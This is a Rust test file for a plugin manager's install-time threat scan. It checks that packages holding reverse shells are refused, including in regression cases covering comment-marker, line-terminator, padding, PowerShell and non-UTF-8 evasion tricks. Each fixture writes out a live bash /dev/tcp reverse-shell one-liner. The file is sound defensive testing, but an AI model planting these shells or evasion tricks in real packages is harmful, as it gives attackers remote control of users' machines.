//! The install-time threat scan (spec: plugin-system, Install-time threat
//! scan): `prometheus plugins install` and `update` of hostile and
//! suspicious packages.

mod common;

use std::path::{Path, PathBuf};

use self::common::{ok, run, stderr, temp_home};

/// A plugin `p` (sample tool) with `extra` files, packed into
/// `<home>/p.pmtpkg`.
fn package(home: &Path, extra: &[(&str, &str)]) -> PathBuf {
    package_at(home, "1.0.0", extra)
}

/// [`package`] at `version` (the package file is replaced).
fn package_at(home: &Path, version: &str, extra: &[(&str, &str)]) -> PathBuf {
    let extra: Vec<(&str, &[u8])> = extra.iter().map(|(n, t)| (*n, t.as_bytes())).collect();
    package_bytes(home, version, &extra)
}

/// [`package_at`] with files that need not be UTF-8.
fn package_bytes(home: &Path, version: &str, extra: &[(&str, &[u8])]) -> PathBuf {
    let dir = home.join("src/p");
    let _ = std::fs::remove_dir_all(&dir);
    pmt_plugins::testkit::install("sample-tool", &dir);
    std::fs::write(
        dir.join("plugin.toml"),
        format!(
            "manifest_version = 1\nid = \"p\"\nversion = \"{version}\"\nkind = \"wasm\"\n\
             description = \"p\"\nlicense = \"MIT\"\nrequires_prometheus = \"*\"\n\
             worlds = [\"tool@1.1\"]\n\n[capabilities]\n"
        ),
    )
    .unwrap();
    for (name, text) in extra {
        std::fs::write(dir.join(name), text).unwrap();
    }
    let out = home.join("p.pmtpkg");
    let _ = std::fs::remove_file(&out);
    ok(&run(
        home,
        &[
            "plugins",
            "pack",
            dir.to_str().unwrap(),
            "--out",
            out.to_str().unwrap(),
        ],
    ));
    out
}

fn install(home: &Path, package: &Path, extra: &[&str]) -> std::process::Output {
    let mut args = vec![
        "plugins",
        "install",
        package.to_str().unwrap(),
        "--allow-unsigned",
    ];
    args.extend_from_slice(extra);
    run(home, &args)
}

fn installed(home: &Path) -> bool {
    home.join("profiles/default/plugins/p").exists()
}

const REVERSE_SHELL: &str = "#!/bin/sh\nbash -i >& /dev/tcp/10.0.0.1/4444 0>&1\n";

#[test]
fn a_reverse_shell_is_blocked_even_with_force() {
    // Spec scenario "Reverse shell blocked even with force".
    let home = temp_home();
    let package = package(home.path(), &[("setup.sh", REVERSE_SHELL)]);
    let out = install(home.path(), &package, &["--force"]);
    assert_eq!(out.status.code(), Some(77), "{}", stderr(&out));
    assert!(
        stderr(&out).contains(
            "plugin 'p' was refused: threat scan verdict dangerous (reverse_shell in setup.sh:2)"
        ),
        "{}",
        stderr(&out)
    );
    assert!(!installed(home.path()));
}

#[test]
fn code_behind_another_languages_comment_marker_is_still_refused() {
    // Regression: a line that merely starts with `/*` or `*` was lowered
    // as a comment, so `--force` installed a reverse shell.
    for (file, text) in [
        (
            "setup.js",
            "/**/ require(\"child_process\").execSync(\"bash -i >& /dev/tcp/10.0.0.1/4444 0>&1\");\n",
        ),
        (
            "setup.py",
            "*_, = [__import__(\"os\").system(\"bash -i >& /dev/tcp/10.0.0.1/4444 0>&1\")]\n",
        ),
    ] {
        let home = temp_home();
        let package = package(home.path(), &[(file, text)]);
        let out = install(home.path(), &package, &["--force"]);
        assert_eq!(out.status.code(), Some(77), "{file}: {}", stderr(&out));
        assert!(
            stderr(&out).contains("threat scan verdict dangerous"),
            "{file}: {}",
            stderr(&out)
        );
        assert!(!installed(home.path()), "{file}");
    }
}

#[test]
fn code_after_an_interpreter_line_terminator_is_still_refused() {
    // Regression: Python ends a line at a lone CR and JS at U+2028, so code
    // after `# x\r` or `// x\u{2028}` runs; the scan lowered it as a comment
    // and `--force` installed a reverse shell.
    for (file, text) in [
        (
            "setup.py",
            "# setup\rimport os; os.system(\"bash -i >& /dev/tcp/10.0.0.1/4444 0>&1\")\n",
        ),
        (
            "setup.js",
            "// setup\u{2028}require(\"child_process\").execSync(\"bash -i >& /dev/tcp/10.0.0.1/4444 0>&1\");\n",
        ),
    ] {
        let home = temp_home();
        let package = package(home.path(), &[(file, text)]);
        let out = install(home.path(), &package, &["--force"]);
        assert_eq!(out.status.code(), Some(77), "{file}: {}", stderr(&out));
        assert!(
            stderr(&out).contains("threat scan verdict dangerous"),
            "{file}: {}",
            stderr(&out)
        );
        assert!(!installed(home.path()), "{file}");
    }
}

#[test]
fn a_reverse_shell_after_megabytes_of_padding_is_still_refused() {
    // Regression: the scan read only the first 4 MiB of a file, so this
    // setup.sh was graded safe and installed without --force.
    let pad = "# pad\n".repeat(750_000);
    let script = format!("#!/bin/sh\n{pad}bash -i >& /dev/tcp/10.0.0.1/4444 0>&1\n");
    let home = temp_home();
    let package = package(home.path(), &[("setup.sh", &script)]);
    let out = install(home.path(), &package, &["--force"]);
    assert_eq!(out.status.code(), Some(77), "{}", stderr(&out));
    assert!(
        stderr(&out).contains("threat scan verdict dangerous (reverse_shell in setup.sh:750002)"),
        "{}",
        stderr(&out)
    );
    assert!(!installed(home.path()));
}

#[test]
fn code_after_a_powershell_block_comment_closes_is_still_refused() {
    // Regression: `#>` closes a `<#` block and PowerShell runs the rest of
    // the line, but the `#` line was lowered as a comment and `--force`
    // installed a reverse shell.
    for text in [
        "<#\n#> Start-Process bash -ArgumentList '-c','bash -i >& /dev/tcp/10.0.0.1/4444 0>&1'\n",
        "<#\n#> Start-Process bash -ArgumentList -c,bash -i >& /dev/tcp/10.0.0.1/4444 0>&1\n",
    ] {
        let home = temp_home();
        let package = package(home.path(), &[("setup.ps1", text)]);
        let out = install(home.path(), &package, &["--force"]);
        assert_eq!(out.status.code(), Some(77), "{text}: {}", stderr(&out));
        assert!(
            stderr(&out).contains("threat scan verdict dangerous (reverse_shell in setup.ps1:2)"),
            "{text}: {}",
            stderr(&out)
        );
        assert!(!installed(home.path()), "{text}");
    }
}

#[test]
fn a_reverse_shell_in_a_script_that_is_not_utf8_is_still_refused() {
    // Regression: one invalid byte in a comment made setup.sh "binary", its
    // findings were dropped and it installed without --force, though
    // /bin/sh runs line 3.
    let script = b"#!/bin/sh\n# build helper \xff\nbash -i >& /dev/tcp/10.0.0.1/4444 0>&1\n";
    let home = temp_home();
    let package = package_bytes(home.path(), "1.0.0", &[("setup.sh", script)]);
    let out = install(home.path(), &package, &["--force"]);
    assert_eq!(out.status.code(), Some(77), "{}", stderr(&out));
    assert!(
        stderr(&out).contains("threat scan verdict dangerous (reverse_shell in setup.sh:3)"),
        "{}",
        stderr(&out)
    );
    assert!(!installed(home.path()));
}

#[test]
fn a_caution_verdict_needs_force_and_the_record_keeps_it() {
    // The same shell text in documentation is lowered to caution, but is
    // still reported.
    let home = temp_home();
    let package = package(home.path(), &[("README.md", REVERSE_SHELL)]);
    let out = install(home.path(), &package, &[]);
    assert_eq!(out.status.code(), Some(77), "{}", stderr(&out));
    assert!(
        stderr(&out).contains("caution reverse_shell in README.md:2"),
        "{}",
        stderr(&out)
    );
    assert!(!installed(home.path()));
    let out = install(home.path(), &package, &["--force"]);
    assert_eq!(out.status.code(), Some(0), "{}", stderr(&out));
    let record =
        std::fs::read_to_string(home.path().join("profiles/default/plugins/p/.install.toml"))
            .unwrap();
    assert!(record.contains("forced = true"), "{record}");
}

#[test]
fn turning_the_scan_off_is_recorded_on_the_install() {
    let home = temp_home();
    let package = package(home.path(), &[("setup.sh", REVERSE_SHELL)]);
    ok(&run(
        home.path(),
        &["config", "set", "plugins.scan_on_install", "false"],
    ));
    let out = install(home.path(), &package, &[]);
    assert_eq!(out.status.code(), Some(0), "{}", stderr(&out));
    let record =
        std::fs::read_to_string(home.path().join("profiles/default/plugins/p/.install.toml"))
            .unwrap();
    assert!(record.contains("scan_skipped = true"), "{record}");
}

fn installed_version(home: &Path) -> String {
    std::fs::read_to_string(home.join("profiles/default/plugins/p/plugin.toml"))
        .unwrap()
        .lines()
        .find_map(|l| l.strip_prefix("version = "))
        .unwrap()
        .trim_matches('"')
        .to_owned()
}

#[test]
fn a_dangerous_update_is_held_until_a_new_version_replaces_it() {
    // Spec: a dangerous verdict on update keeps the previous version
    // active and disables the update until reviewed.
    let home = temp_home();
    let package = package(home.path(), &[]);
    ok(&install(home.path(), &package, &[]));
    package_at(home.path(), "1.0.1", &[("setup.sh", REVERSE_SHELL)]);
    let update = |home: &Path| run(home, &["plugins", "update", "p", "--allow-unsigned"]);
    let out = update(home.path());
    assert_eq!(out.status.code(), Some(77), "{}", stderr(&out));
    assert!(
        stderr(&out).contains("verdict dangerous"),
        "{}",
        stderr(&out)
    );
    assert_eq!(installed_version(home.path()), "1.0.0");
    let record =
        std::fs::read_to_string(home.path().join("profiles/default/plugins/p/.install.toml"))
            .unwrap();
    assert!(record.contains("[held_update]"), "{record}");
    // Held: not offered or fetched again.
    let listed = ok(&run(home.path(), &["plugins", "check-updates"]));
    assert!(listed.contains("is disabled until reviewed"), "{listed}");
    let out = update(home.path());
    assert_eq!(out.status.code(), Some(77), "{}", stderr(&out));
    assert!(
        stderr(&out).contains("is disabled until reviewed (threat scan verdict dangerous"),
        "{}",
        stderr(&out)
    );
    assert_eq!(installed_version(home.path()), "1.0.0");
    // A different (clean) update replaces it and clears the hold.
    package_at(home.path(), "1.0.2", &[]);
    let out = update(home.path());
    assert_eq!(out.status.code(), Some(0), "{}", stderr(&out));
    assert_eq!(installed_version(home.path()), "1.0.2");
    let record =
        std::fs::read_to_string(home.path().join("profiles/default/plugins/p/.install.toml"))
            .unwrap();
    assert!(!record.contains("held_update"), "{record}");
}
